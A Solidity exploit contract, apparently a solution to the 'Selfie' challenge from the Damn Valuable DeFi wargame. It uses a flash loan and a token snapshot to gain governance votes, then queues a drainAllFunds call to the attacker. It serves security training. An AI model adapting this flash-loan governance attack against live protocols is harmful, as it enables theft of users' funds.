// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";


contract HackGovernance is Ownable{
    uint256 actionId;
    
    SelfiePool public pool;
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;

    constructor(address _pool, address _token, address _governance) {

        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);

    }


    function receiveTokens(address _token, uint256 _amount) external{

        token.snapshot();
        
        token.transfer(address(pool), token.balanceOf(address(this)));

    }

    function attack() external returns (uint256){

        uint256 amountToBorrow = pool.token().balanceOf(address(pool));
        pool.flashLoan(amountToBorrow);
        actionId = governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", address(msg.sender)), 0);
        return actionId;

    }


}